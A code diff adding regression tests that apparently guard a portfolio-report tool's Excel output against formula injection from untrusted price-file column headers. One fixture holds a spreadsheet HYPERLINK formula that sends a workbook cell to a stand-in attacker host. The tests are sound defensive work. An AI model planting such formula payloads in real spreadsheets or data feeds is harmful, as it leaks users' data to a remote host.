@@ -227,6 +227,77 @@ def test_write_excel_report_skips_none_and_promotes_series(tmp_path):
     assert set(sheets) == {"a"}
 
 
+#: Column headers a third-party price file can carry. xlsxwriter writes any
+#: string starting with "=" as a formula unless told not to.
+_HOSTILE_NAMES = ['=HYPERLINK("http://attacker.invalid/?x="&A1,"details")', "=1+1", "BOND"]
+
+
+def _formula_cells(path: Path) -> list[tuple[str, str]]:
+    from openpyxl import load_workbook
+
+    workbook = load_workbook(path)
+    return [
+        (sheet.title, cell.coordinate)
+        for sheet in workbook.worksheets
+        for row in sheet.iter_rows()
+        for cell in row
+        if cell.data_type == "f"
+    ]
+
+
+def test_an_asset_name_is_never_written_as_a_formula(tmp_path):
+    """A price-file header became a live formula in every sheet that named it.
+
+    Ten formula cells from one CSV in the review that found it — `weights!A2`,
+    `risk_decomposition!A2` and on — including a `HYPERLINK` that sends a cell
+    of the workbook to a remote host when clicked.
+    """
+    returns = pd.DataFrame(
+        prices_to_returns(sample_dataset(n_periods=300, assets=["US_Equity", "Gold", "Cash"]))
+        .to_numpy(),
+        columns=_HOSTILE_NAMES,
+    )
+    run = run_engine(returns, EngineConfig(optimizer=OptimizerSpec(name="equal_weight")))
+    out = write_excel_report(tmp_path / "r.xlsx", run_sheets(run))
+    assert _formula_cells(out) == []
+    # Written as the text it was, not dropped.
+    weights = pd.read_excel(out, sheet_name="weights", index_col=0)
+    assert list(weights.index) == _HOSTILE_NAMES
+
+
+def test_an_ingested_panel_is_written_without_formulas(tmp_path):
+    from optimization_engine.cli import _write_panel
+
+    frame = pd.DataFrame(
+        [[1.0, 2.0, 3.0]],
+        index=pd.DatetimeIndex(["2024-01-02"]),
+        columns=_HOSTILE_NAMES,
+    )
+    out = _write_panel(tmp_path / "prices.xlsx", frame)
+    assert out is not None
+    assert _formula_cells(out) == []
+
+
+def test_the_app_writes_its_workbooks_through_the_same_writer():
+    """The app builds two workbooks in memory, for its download buttons.
+
+    Both called `pd.ExcelWriter(..., engine="xlsxwriter")` directly, with the
+    formula default on. A scan rather than a page render, because AppTest does
+    not model a download's bytes.
+    """
+    import ast
+
+    tree = ast.parse((ROOT / "app" / "streamlit_app.py").read_text(encoding="utf-8"))
+    direct = [
+        node.lineno
+        for node in ast.walk(tree)
+        if isinstance(node, ast.Call)
+        and isinstance(node.func, ast.Attribute)
+        and node.func.attr == "ExcelWriter"
+    ]
+    assert direct == [], f"pd.ExcelWriter called directly at line(s) {direct}"
+
+
 # ---------------------------------------------------------------------------
 # Benchmark flags
 # ---------------------------------------------------------------------------
